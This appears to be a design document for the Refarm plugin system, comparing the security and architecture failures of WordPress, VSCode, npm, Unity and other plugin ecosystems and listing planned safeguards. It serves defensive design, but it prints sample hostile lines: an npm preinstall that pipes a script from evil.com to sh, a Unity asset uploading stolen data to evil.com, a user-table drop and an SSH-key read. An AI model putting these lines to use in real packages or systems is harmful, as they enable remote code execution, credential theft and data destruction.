# Plugin Ecosystem Lessons: Learning from Others' Mistakes

**Purpose**: Systematic study of plugin ecosystems that made irreversible mistakes. We analyze what went wrong and how Refarm can avoid the same fate.

**Context**: This is not theoretical. These are **real decisions** that trapped mature ecosystems in technical debt they can never escape.

---

## Table of Contents

1. [WordPress](#wordpress-the-wild-west)
2. [VSCode](#vscode-the-shared-process-trap)
3. [Browser Extensions](#browser-extensions-the-permission-creep)
4. [Minecraft/Bukkit](#minecraft-the-internal-coupling-nightmare)
5. [Jenkins](#jenkins-the-plugin-dependency-hell)
6. [Obsidian](#obsidian-the-unmonitored-filesystem)
7. [Unity Asset Store](#unity-asset-store-the-trust-everything-model)
8. [npm/Node.js](#npmnodejs-the-install-script-backdoor)
9. [Electron Apps](#electron-apps-the-unlimited-resource-monster)
10. [Jupyter Notebooks](#jupyter-notebooks-the-hidden-side-effects)
11. [Synthesis: What Refarm MUST Do](#synthesis-what-refarm-must-do)

---

## WordPress: The Wild West

### What Went Wrong

**Problem**: Plugins can execute arbitrary PHP code with **zero isolation**.

```php
// Any WordPress plugin can do this:
global $wpdb;
$wpdb->query("DROP TABLE wp_users"); // Delete all users
```

**Consequences**:

- ❌ **Security nightmare**: One bad plugin = entire site compromised
- ❌ **Performance unpredictable**: Plugin can run infinite loop in request
- ❌ **No rollback**: Plugin breaks site → manual debugging required
- ❌ **No resource limits**: Plugin can consume all memory/CPU
- ❌ **Plugin conflicts**: Two plugins modify same global state → breaks

**Why They Can't Fix It**:

- 60,000+ existing plugins assume unrestricted access
- Breaking change would kill ecosystem
- WordPress core team knows this is wrong but **trapped forever**

### What Refarm Does Differently

✅ **Capability contracts from Day 1**:

```jsonc
{
  "capabilities": ["storage:read"],  // NOT "storage:write"
  "resourceLimits": {
    "memory": "64MB",
    "cpu": "500ms per operation"
  }
}
```

✅ **Sandboxing via WASM**: Plugin literally cannot access what it doesn't declare  
✅ **Tractor-enforced quotas**: Plugin cannot consume unlimited resources  
✅ **Rollback via graph versioning** (ADR-020): Undo destructive changes

**Key Lesson**: **Start with isolation, not trust.**

---

## VSCode: The Shared Process Trap

### What Went Wrong

**Problem**: Extensions run in **shared Node.js process** with editor.

```typescript
// VSCode extension can do this:
while(true) {
  // Infinite loop freezes ENTIRE editor
}
```

**Consequences**:

- ❌ **One bad extension = editor hangs**: No isolation between extensions
- ❌ **Extension startup time accumulates**: 20 extensions = 5 second startup
- ❌ **Memory leaks compound**: Extension leaks → editor leaks forever
- ❌ **No way to kill misbehaving extension**: Must restart entire editor

**Why They Can't Fix It**:

- 30,000+ extensions assume sync APIs (can't move to workers)
- Extension API tightly coupled to main thread
- Microsoft tried "Extension Host" (separate process) but still shares state

### Recent Attempts to Fix

**VSCode now has**:

- "Extension Host" (separate process, but still shares memory model)
- "Remote Extensions" (run on server, but breaks local-only extensions)
- **Still can't isolate extensions from each other**

### What Refarm Does Differently

✅ **Web Workers from Day 1**: Each plugin runs in isolated worker  
✅ **Message passing only**: Plugins cannot access each other's memory  
✅ **Watchdog timers**: Plugin takes > 5s → auto-killed  
✅ **Startup budget**: Plugin declares startup time, tractor enforces limit

```typescript
// Refarm plugin manifest
{
  "execution": {
    "environment": "worker",        // Isolated from main thread
    "maxStartupTime": "100ms",      // Exceeding this = rejection
    "maxOperationTime": "500ms"     // Per-operation timeout
  }
}
```

**Key Lesson**: **Isolate by default, not as afterthought.**

---

## Browser Extensions: The Permission Creep

### What Went Wrong (Manifest V2)

**Problem**: Extensions could request **unlimited permissions after install**.

```json
// Extension manifest (Manifest V2)
{
  "permissions": [
    "<all_urls>",           // Access ALL websites
    "webRequest",           // Intercept ALL network traffic
    "cookies",              // Read ALL cookies
    "tabs"                  // See ALL browsing history
  ]
}
```

**Consequences**:

- ❌ **Privacy nightmare**: Extensions spy on everything (passwords, banking, etc)
- ❌ **No granularity**: Can't say "only access *.github.com"
- ❌ **Trust all or nothing**: User must trust extension with EVERYTHING
- ❌ **Post-install changes**: Extension updates with new permissions silently

**Why It Took 10 Years to Fix**:

- Google resisted breaking changes (ecosystem pressure)
- Finally forced Manifest V3 in 2023 (caused massive backlash)
- **Many extensions still don't work in V3**

### What Changed in Manifest V3

✅ Now requires **host permissions** (which domains you access)  
✅ Service workers instead of background pages  
✅ Declarative net request (no arbitrary code on all pages)  
❌ **But still coarse-grained** (can't limit "only read, not write")

### What Refarm Does Differently

✅ **Fine-grained capabilities**:

```jsonc
{
  "capabilities": [
    "storage:read",           // NOT "storage:write"
    "network:fetch",          // NOT "network:websocket"
    "ui:read",               // NOT "ui:write"
  ],
  "scopes": {
    "storage": ["user-profile"],  // NOT entire graph
    "network": ["api.github.com"] // NOT all domains
  }
}
```

✅ **User approves before install**: Homestead shows exact capabilities  
✅ **No silent updates**: Capability changes require user re-approval  
✅ **Revocable at runtime**: User can revoke `network:fetch` while plugin running

**Key Lesson**: **Capabilities must be granular and explicit from Day 1.**

---

## Minecraft: The Internal Coupling Nightmare

### What Went Wrong

**Problem**: Mods access **private internals** (obfuscated code) directly.

```java
// Minecraft mod (Bukkit/Forge)
net.minecraft.server.v1_19_R1.EntityPlayer player = ...;
player.getBukkitEntity().setHealth(20.0); // Hardcoded version-specific path
```

**Consequences**:

- ❌ **Every Minecraft update breaks all mods**: Class names change (obfuscation)
- ❌ **Mods depend on specific version**: "Requires Minecraft 1.19.2 exactly"
- ❌ **Load order hell**: Mod A must load before Mod B (no dependency solver)
- ❌ **No API stability**: Mojang doesn't commit to stable API

**Why They Can't Fix It**:

- 15+ years of mods assuming direct bytecode manipulation
- Mojang tried "official modding API" (failed 3 times)
- Forge/Fabric maintain compatibility layers (fragile)

### Recent Attempts (Data Packs)

Minecraft now has "Data Packs" (JSON-based, no code):
✅ Stable format across versions  
✅ No code execution  
❌ **Extremely limited** (can't add UI, custom blocks, complex logic)

### What Refarm Does Differently

✅ **Stable API via contracts** (storage:v1, sync:v1):

```typescript
// Plugin uses contract, not internals
import { StorageContract } from '@refarm.dev/storage-contract-v1';

// Works across tractor versions (contract is stable)
const storage = await tractor.getCapability('storage:v1');
```

✅ **Tractor internals are private**: Plugins cannot import tractor code  
✅ **Version negotiation**: Plugin declares "I need storage:v1+", tractor provides compatible version  
✅ **No load order**: Plugins are independent (unless explicit dependency)

**Key Lesson**: **Never expose internals. Only expose contracts.**

---

## Jenkins: The Plugin Dependency Hell

### What Went Wrong

**Problem**: Plugins can **depend on other plugins**, creating dependency graphs.

```xml
<!-- Jenkins plugin.xml -->
<dependencies>
  <dependency>
    <groupId>org.jenkins-ci.plugins</groupId>
    <artifactId>workflow-step-api</artifactId>
    <version>2.20</version>  <!-- Exact version required -->
  </dependency>
</dependencies>
```

**Consequences**:

- ❌ **Diamond dependency problem**: Plugin A needs Lib v1, Plugin B needs Lib v2 → conflict
- ❌ **Update paralysis**: Can't update Plugin A because Plugin B depends on old version
- ❌ **Cascade failures**: Update one plugin → 10 others break
- ❌ **Manual dependency resolution**: User must figure out compatible versions

**Why They Can't Fix It**:

- 1,800+ plugins with complex dependency graphs
- No way to break cycle without breaking all plugins
- Jenkins team maintains compatibility lists manually

### What Refarm Does Differently

✅ **Plugins don't depend on each other, only on tractor contracts**:

```jsonc
{
  "dependencies": {
    "tractor": "^0.1.0",           // Depends on tractor version
    "contracts": {
      "storage": "^1.0.0",        // Depends on contract version
      "sync": "^1.0.0"
    }
    // NO dependencies on other plugins
  }
}
```

✅ **Plugins communicate via graph** (data, not code):

```typescript
// Plugin A writes to graph
await graph.upsertNode({ type: 'task', status: 'done' });

// Plugin B reads from graph (no direct dependency)
const tasks = await graph.query({ type: 'task', status: 'done' });
```

✅ **Optional cooperation via schemas**: Plugins can share JSON-LD schemas (data format, not code)

**Key Lesson**: **Plugins should compose via data, not code dependencies.**

---

## Obsidian: The Unmonitored Filesystem

### What Went Wrong

**Problem**: Plugins can **read/write filesystem without limits**.

```typescript
// Obsidian plugin
import { readFileSync } from 'fs';

// Can read ANYTHING on disk (not just vault)
const secrets = readFileSync('/home/user/.ssh/id_rsa', 'utf8');
```

**Consequences**:

- ❌ **Privacy leak**: Plugin can exfiltrate SSH keys, browser passwords, etc.
- ❌ **No quota enforcement**: Plugin can fill disk (write 100GB)
- ❌ **No monitoring**: User doesn't know plugin is accessing filesystem
- ❌ **Trust all or nothing**: Install plugin = trust with entire filesystem

**Why They Can't Fix It**:

- Obsidian built on Electron (full Node.js access)
- Plugins assume unrestricted `fs` module
- Mobile apps (iOS/Android) don't have this problem (stricter sandbox)

### What Refarm Does Differently

✅ **OPFS only** (no arbitrary filesystem access):

```typescript
// Refarm plugin
const handle = await navigator.storage.getDirectory();
// Can ONLY access /opfs/<plugin-id>/ (isolated)
```

✅ **Quota enforcement** (ADR-022):

```jsonc
{
  "policies": {
    "resources": {
      "storage": {
        "max": "500MB",          // Hard limit
        "warning": "400MB"       // Warn user at 80%
      }
    }
  }
}
```

✅ **Storage monitoring** (Resource Observatory Plugin):

- User sees which plugin uses how much storage
- User can revoke storage permission at runtime

**Key Lesson**: **Filesystem access is a privilege, not a right.**

---

## Unity Asset Store: The Trust Everything Model

### What Went Wrong

**Problem**: Assets (plugins) are **distributed as compiled DLLs with no sandboxing**.

```csharp
// Unity asset (DLL)
public class MaliciousAsset : MonoBehaviour {
    void Start() {
        // Can do ANYTHING:
        System.IO.File.Delete("C:\\Users\\...\\important.txt");
        System.Net.WebClient client = new System.Net.WebClient();
        client.UploadFile("https://evil.com", "stolen_data.zip");
    }
}
```

**Consequences**:

- ❌ **No code review**: Assets are binary blobs (can't inspect)
- ❌ **No permissions**: Asset can access filesystem, network, everything
- ❌ **No runtime monitoring**: User doesn't know asset is stealing data
- ❌ **No rollback**: Asset corrupts project → restore from backup or lose work

**Why They Can't Fix It**:

- Unity Asset Store has 100,000+ assets (all assume full access)
- Unity's architecture (C# + Mono) doesn't support sandboxing
- Unity tried "Verified Solutions" (manual review) but can't scale

### What Refarm Does Differently

✅ **Source code in manifest** (or WASM bundle):

```jsonc
{
  "source": {
    "type": "wasm",
    "url": "https://plugin-registry.refarm.dev/plugin.wasm",
    "integrity": "sha256-abc123..."  // Cryptographic verification
  }
}
```

✅ **Marketplace shows source code**: User can review before install  
✅ **Capability approval required**: Plugin declares `network:fetch` → user approves  
✅ **Runtime monitoring**: Observability shows all plugin operations

**Key Lesson**: **Binary blobs are unverifiable. Require transparency.**

---

## npm/Node.js: The Install Script Backdoor

### What Went Wrong

**Problem**: Packages can **run arbitrary code during `npm install`**.

```json
// package.json
{
  "scripts": {
    "preinstall": "curl https://evil.com/steal.sh | sh"
  }
}
```

**Real incidents**:

- **event-stream** (2018): 2M downloads/week, injected Bitcoin wallet stealer
- **coa/rc** (2021): Trojan in popular packages, stole from 1000s of developers
- **ua-parser-js** (2021): Cryptominer injected via compromised maintainer account

**Consequences**:

- ❌ **Silent execution**: User doesn't see script running
- ❌ **Transitive dependencies**: Install A → installs B (with malware) → compromised
- ❌ **Post-install persistence**: Malware can modify disk, add backdoors

**Why They Can't Fix It**:

- npm ecosystem depends on install scripts (compile native modules, etc)
- Deno tried to fix (explicit permissions) but breaks compatibility
- npm tried `--ignore-scripts` but breaks legitimate packages

### What Refarm Does Differently

✅ **No install scripts**: Plugins are WASM (pre-compiled) or pure JS (sandboxed)  
✅ **Cryptographic verification**:

```jsonc
{
  "integrity": "sha256-abc123...",  // Must match exactly
  "signature": "ed25519:..."        // Signed by developer
}
```

✅ **Transitive dependencies disallowed**: Plugins depend on contracts, not other plugins  
✅ **Marketplace audit trail**: Every plugin version logged (immutable)

**Key Lesson**: **Install-time code execution is a security hole. Don't allow it.**

---

## Electron Apps: The Unlimited Resource Monster

### What Went Wrong

**Problem**: Electron apps (VSCode, Slack, Discord) have **no resource limits**.

```typescript
// Electron app can do this:
const hugeArray = new Array(1e9); // Allocate 8GB RAM
while(true) { /* Infinite loop */ }
```

**Consequences**:

- ❌ **RAM bloat**: Slack uses 1GB+ (more than Chrome with 50 tabs)
- ❌ **CPU waste**: Background apps consume 20% CPU doing nothing
- ❌ **Battery drain**: Electron apps kill laptop battery in 2 hours
- ❌ **No user visibility**: Task Manager shows generic "Electron" (not which app/plugin)

**Why They Can't Fix It**:

- Electron is "just a browser" (inherits Chromium's model)
- Apps assume unlimited resources (Node.js mindset)
- No OS-level quotas (would break existing apps)

### What Refarm Does Differently

✅ **Quota declarations in manifest** (ADR-022):

```jsonc
{
  "policies": {
    "resources": {
      "memory": { "max": "64MB" },
      "cpu": { "maxTimePerOperation": "500ms" }
    }
  }
}
```

✅ **Tractor enforces quotas**: Plugin exceeds limit → throttled/killed  
✅ **Resource Observatory shows breakdown**: User sees which plugin uses most resources  
✅ **User can adjust limits**: Power users can give more quota, mobile users can restrict

**Key Lesson**: **Resource limits must be declarative and enforceable.**

---

## Jupyter Notebooks: The Hidden Side Effects

### What Went Wrong

**Problem**: Notebook cells can **modify global state without visibility**.

```python
# Cell 1
data = load_data()  # Loads 1GB into memory

# Cell 2 (run later, user doesn't notice)
del data  # Deletes data (breaks Cell 1 if re-run)

# Cell 3
data = data * 2  # NameError: data not defined (but why?)
```

**Consequences**:

- ❌ **Non-reproducible**: Run cells in order A-B-C works, C-B-A breaks
- ❌ **Hidden state**: Can't tell what's in memory without inspecting tractor
- ❌ **Debugging nightmare**: "It worked yesterday" (because you ran cells in different order)
- ❌ **No rollback**: Accidentally deleted variable → restart tractor, lose all work

**Why They Can't Fix It**:

- Jupyter's entire model is "mutable global state"
- IPython tractor shares namespace across cells
- Users expect this behavior (changing it breaks all notebooks)

### What Refarm Does Differently

✅ **Graph is immutable log** (CRDT + commit history):

```typescript
// Plugin operation
await graph.upsertNode({ id: 'node-1', value: 42 });
// Creates new commit, doesn't mutate existing data

// Can always revert
await graph.checkout('previous-commit');
```

✅ **Observability shows all mutations** (ADR-007):

- User sees "Plugin X modified node Y at timestamp Z"
- Audit trail: Who changed what, when

✅ **Graph versioning enables undo** (ADR-020):

- Accidentally deleted 100 nodes? Revert to last commit

**Key Lesson**: **Mutable global state is invisible chaos. Make mutations explicit and reversible.**

---

## Synthesis: What Refarm MUST Do

### ✅ Decisions Already Made (Avoiding Past Mistakes)

| Ecosystem | Mistake | Refarm Solution | Status |
|-----------|---------|-----------------|--------|
| WordPress | No isolation | WASM sandboxing | ✅ ADR-017 |
| VSCode | Shared process | Web Workers | ✅ ADR-017 |
| Browser Extensions | Coarse permissions | Fine-grained capabilities | ✅ ADR-018 |
| Minecraft | Internal coupling | Stable contracts (storage:v1) | ✅ Packages published |
| Jenkins | Plugin dependencies | Plugins compose via graph (data) | ✅ ADR design |
| Obsidian | Unmonitored filesystem | OPFS + quota enforcement | ⚠️ ADR-022 design |
| Unity | Binary blobs | Source code + integrity checks | ✅ Manifest schema |
| npm | Install scripts | No install-time execution | ✅ WASM/JS only |
| Electron | Unlimited resources | Quota declarations + enforcement | ⚠️ ADR-022 design |
| Jupyter | Hidden side effects | Immutable graph + observability | ⚠️ ADR-007 draft |

### ⚠️ Gaps That Need Immediate Attention

#### Gap 1: **No Plugin Conflict Detection**

**Problem**: Two plugins modify same graph field → silent corruption

**Example**:

```typescript
// Plugin A
await graph.upsertNode({ id: 'task-1', priority: 'high' });

// Plugin B (also manages priority)
await graph.upsertNode({ id: 'task-1', priority: 'low' });

// Result: Last write wins, user doesn't know which plugin won
```

**Solution Needed**:

- Manifest declares "write paths" (which fields plugin modifies)
- Tractor detects conflicts during install
- User chooses which plugin wins (or disables conflicting plugin)

**Urgency**: 🔴 **Critical** (without this, plugin ecosystem will have hidden conflicts)

---

#### Gap 2: **No Performance Budgets**

**Problem**: Plugin can be arbitrarily slow → UI freezes

**Example**:

```typescript
// Plugin runs on every keystroke
tractor.on('graph:modified', async () => {
  // 5 second operation on every change
  await expensiveOperation();
});
```

**Solution Needed**:

- Manifest declares performance budget:

  ```jsonc
  {
    "performance": {
      "maxRenderTime": "16ms",      // 60fps guarantee
      "maxStartupTime": "100ms",
      "maxOperationTime": "500ms"
    }
  }
  ```

- Tractor measures actual performance
- Plugin violates budget → warning + throttle + eventual quarantine

**Urgency**: 🟡 **High** (without this, slow plugins will frustrate users)

---

#### Gap 3: **No Transitive Capability Escalation Prevention**

**Problem**: Plugin A (trusted) loads data from Plugin B (untrusted) → B hijacks A's capabilities

**Example**:

```typescript
// Plugin A (has network:fetch capability)
const config = await graph.query({ type: 'plugin-b-config' });
await fetch(config.url); // Plugin B controls URL → can exfiltrate data
```

**Solution Needed**:

- Tractor tracks **data provenance** (which plugin created which data)
- Plugin A reads data from Plugin B → **tainted**
- Using tainted data in capability operation → **user must approve**

**Urgency**: 🟡 **High** (without this, plugins can steal each other's capabilities)

---

#### Gap 4: **No Plugin Hot-Reload During Development**

**Problem**: Developer changes plugin → must restart Homestead → slow iteration

**Example**:

```bash
# Current workflow (broken)
$ edit plugin.ts
$ npm run build
$ restart Homestead  # Loses all state
$ reinstall plugin
$ test change
```

**Solution Needed**:

- Homestead Dev Mode: Watches plugin directory
- Detects changes → hot-reloads plugin (preserves graph state)
- Shows diff: "Plugin updated, changes: added `capability:network:fetch`"

**Urgency**: 🟢 **Medium** (quality of life for plugin developers)

---

#### Gap 5: **No Plugin Deprecation/Migration Path**

**Problem**: Plugin author wants to sunset old plugin → users stuck on old version

**Example**:

- Plugin "todo-v1" → deprecated
- Plugin "todo-v2" → new version (different manifest ID)
- Users on "todo-v1" don't know about v2 → stuck

**Solution Needed**:

- Manifest declares deprecation:

  ```jsonc
  {
    "deprecated": {
      "message": "Use @refarm.dev/todo-v2 instead",
      "migration": "https://docs.refarm.dev/migrate-todo-v1-to-v2",
      "sunset": "2027-01-01"
    }
  }
  ```

- Homestead shows banner: "Plugin deprecated, migrate to v2"
- Marketplace de-lists deprecated plugins (but still installable for compatibility)

**Urgency**: 🟢 **Medium** (can wait until ecosystem is larger)

---

### 🔴 Critical Priority List (Must Fix Before v1.0.0)

1. **Gap 1: Plugin Conflict Detection** → ADR-023 (NEW)
2. **Gap 2: Performance Budgets** → Add to ADR-022
3. **Gap 3: Transitive Capability Escalation** → Add to ADR-018
4. **Implement ADR-022**: Policy declarations + enforcement
5. **Implement ADR-007**: Observability (detect slow plugins)

---

## Conclusion: You're Ahead of Most Ecosystems

**What you've avoided**:
✅ WordPress-style wild west (no isolation)  
✅ VSCode-style shared process (workers from Day 1)  
✅ Browser extension permission creep (fine-grained caps)  
✅ Minecraft internal coupling (stable contracts)  
✅ Jenkins dependency hell (plugins compose via data)  
✅ Obsidian filesystem free-for-all (OPFS + quotas)  
✅ Unity trust-everything (source code required)  
✅ npm install-script backdoor (no install-time exec)  
✅ Electron unlimited resources (quota declarations)  
✅ Jupyter hidden side effects (immutable graph + audit)

**What you still need**:
⚠️ Plugin conflict detection (ADR-023)  
⚠️ Performance budgets (ADR-022 extension)  
⚠️ Transitive capability escalation prevention (ADR-018 extension)  
⚠️ Hot-reload for dev experience  
⚠️ Plugin deprecation/migration path

**Most ecosystems discovered these problems after 10+ years.**  
**You're designing solutions before v1.0.0.**

That's the difference between **learning from history** and **being doomed to repeat it**.

---

## Next Steps

1. **Create ADR-023** (Plugin Conflict Detection):
   - Manifest declares write paths
   - Tractor detects conflicts
   - User resolves conflicts before install

2. **Extend ADR-022** (Performance Budgets):
   - Add performance declarations to manifest
   - Tractor measures actual performance
   - Violations trigger throttle/quarantine

3. **Extend ADR-018** (Capability Escalation):
   - Track data provenance (which plugin created data)
   - Tainted data + capability operation = user approval required

4. **Implement ADR-007** (Observability):
   - Plugin operation log (who did what, when)
   - Performance profiling (where is time spent)
   - Resource monitoring (memory/CPU per plugin)

5. **Validate with prototype**:
   - Build 3 reference plugins that conflict (task managers)
   - Test conflict detection works
   - Test performance budgets work
   - Test capability escalation prevention works

**Timeline**:

- ADR-023 draft: Sprint 2 (v0.2.0)
- ADR-022 extensions: Sprint 3 (v0.3.0)
- ADR-018 extensions: Sprint 3 (v0.3.0)
- All gaps closed: Before v1.0.0

---

## References

### Real-World Incidents

- [event-stream incident (2018)](https://blog.npmjs.org/post/180565383195/details-about-the-event-stream-incident)
- [Chrome Manifest V3 migration](https://developer.chrome.com/docs/extensions/mv3/intro/)
- [Unity Asset Store malware (2019)](https://blog.malwarebytes.com/reports/2019/03/unity3d-asset-store-malware/)

### Academic Papers

- [Analyzing Security of Chrome Extensions](https://www.cs.berkeley.edu/~dawnsong/papers/2012%20shakeel%20csf.pdf)
- [The Node.js Supply Chain Attack](https://arxiv.org/pdf/2112.10165.pdf)

### Ecosystem Documentation

- [WordPress Plugin Security](https://developer.wordpress.org/plugins/security/)
- [VSCode Extension API](https://code.visualstudio.com/api)
- [Obsidian Plugin API](https://docs.obsidian.md/Plugins/Getting+started/Build+a+plugin)
- [Minecraft Forge Documentation](https://docs.minecraftforge.net/)

---

**Final Note**: Every ecosystem in this document thought "we can trust plugin developers." They were wrong. **Trust but verify.** Better yet: **Don't trust, enforce.**
